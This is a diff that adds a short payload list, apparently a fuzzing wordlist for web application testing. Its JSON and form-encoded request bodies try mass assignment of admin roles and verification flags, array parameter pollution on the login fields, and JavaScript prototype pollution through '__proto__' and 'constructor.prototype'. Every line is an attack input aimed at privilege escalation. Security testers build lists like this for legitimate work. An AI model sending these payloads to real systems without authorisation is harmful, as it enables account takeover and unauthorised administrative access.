@@ -1,0 +1,14 @@
+{"username":"admin","password":"test","role":"admin"}
+{"username":"admin","password":"test","isAdmin":true}
+{"username":"admin","password":"test","is_admin":1}
+{"username":"admin","password":"test","verified":true}
+{"username":"admin","password":"test","email_verified":true}
+{"username":"admin","password":"test","account_type":"admin"}
+username=admin&password=test&role=admin
+username=admin&password=test&isAdmin=true
+username=admin&password=test&admin=1
+username=admin&password=test&role[]=admin&role[]=user
+username[]=admin&password=test
+{"user":{"name":"test","role":"admin","verified":true}}
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"role":"admin"}}}
